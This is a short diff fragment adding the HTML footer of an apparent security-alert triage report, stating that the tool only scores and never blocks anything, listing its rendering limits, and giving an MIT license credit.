+  Recommendations only: this tool reads and scores, it never contains, blocks or changes anything.
+  Verdicts are pattern matches and third-party reputation, not proof of compromise.<br>
+  So this file stays small enough to attach to a ticket it renders at most
+  100 case(s), 25 alert(s) per case, 25 indicator
+  row(s) per alert and 2000 character(s) of any one command line; anything
+  past that is marked in place and kept in full in the JSON export.<br>
+  Written by Baris Burak Turgut &middot; MIT License &middot; provided &quot;AS IS&quot;, without warranty of any kind.
+</footer>
+</body></html>
